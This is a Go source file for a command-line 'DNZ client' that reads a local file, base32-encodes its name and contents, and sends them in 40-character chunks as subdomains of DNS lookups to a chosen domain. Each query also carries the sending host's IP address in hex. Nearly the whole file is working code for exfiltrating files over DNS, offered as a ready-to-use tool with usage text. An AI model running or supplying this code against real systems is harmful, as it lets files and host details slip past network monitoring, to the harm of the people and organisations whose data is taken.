// DNZ client by zalt3es
// URL: https://github.com/zalt3es/dnz
package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"encoding/base32"
	"encoding/hex"
	"strings"
	"net"
	"time"
)

func getTheIP(url string, retries int, sleep float64){
	fmt.Println(url,"will try",retries,"times with delay of",sleep)
	for i:=0; i<retries; i++ {
		time.Sleep(time.Duration(sleep) * time.Second)
		addr, err := net.LookupIP(url)
		if err == nil {
			tmp := string(addr[0])
			fmt.Println(addr[0])
			if tmp == "127.0.0.1" {
				return
			}
		}
	}
}

func main() {
	filename, server, timeToSleep, retries, fileNr  :="tryMe.txt", "my.domain.com", 0.0, 2, 1

	fmt.Println("DNZ client, usage:")
	fmt.Println(os.Args[0],"fileName domain timeToSleep retriesIfNoDNSresponse fileNumberIfMultipleSent\nDefaults:")
	fmt.Println(os.Args[0],filename,server,timeToSleep,retries,fileNr,"\n")
	
	if len(os.Args)>1 { filename = os.Args[1] }
	if len(os.Args)>2 { server = os.Args[2] }
	if len(os.Args)>3 { timeToSleep, _ = strconv.ParseFloat(os.Args[3], 32) }
	if len(os.Args)>4 { retries, _ = strconv.Atoi(os.Args[4]) }
	if len(os.Args)>5 { fileNr, _ = strconv.Atoi(os.Args[5]) }

	fmt.Printf("Sending %v to %v with %f seconds delay\nretries if DNS not responding: %d\nfile number (in case you want to send multiple): %d\n\n",filename,server,timeToSleep,retries,fileNr)
	content, err := ioutil.ReadFile(filename)     // the file is inside the local directory
	if err != nil {
		fmt.Println("Err")
		return
	}
	bfilename := filename
	if len(bfilename)>20 {
		bfilename = bfilename[len(bfilename)-20:len(bfilename)]
	}
	bfilename = strings.ReplaceAll(base32.StdEncoding.EncodeToString([]byte(bfilename)),"=","")
//	fmt.Println(bfilename)
//	fmt.Println(string(content))    // This is some content
	str := strings.ReplaceAll(base32.StdEncoding.EncodeToString(content),"=","")
//	fmt.Println(str)
	chunkSize := 40
	var ourArray []string
	for len(str)>chunkSize {
		ourArray = append(ourArray, str[:chunkSize])
		str = str[chunkSize:]
	}
	ourArray = append(ourArray,str)
//	fmt.Println(ourArray)
	//now we have all array and filename, should capture IP and start transfer
	host, err := os.Hostname()
	addr, err := net.LookupIP(host)
//	fmt.Println(addr[len(addr)-1])
	encodedStr := hex.EncodeToString(addr[len(addr)-1])
	encodedStr = encodedStr[len(encodedStr)-8:]
	fmt.Println(encodedStr)
	//initiating
	host = fmt.Sprintf("%v%d%08d%v.%v",encodedStr,fileNr,len(ourArray),bfilename,server)
	getTheIP(host,retries,0.0)
	for i:=0; i<len(ourArray); i++ {
		host = fmt.Sprintf("%v%d%04d%v.%v",encodedStr,fileNr,(i+1),ourArray[i],server)
		getTheIP(host,retries,timeToSleep)
	}
}
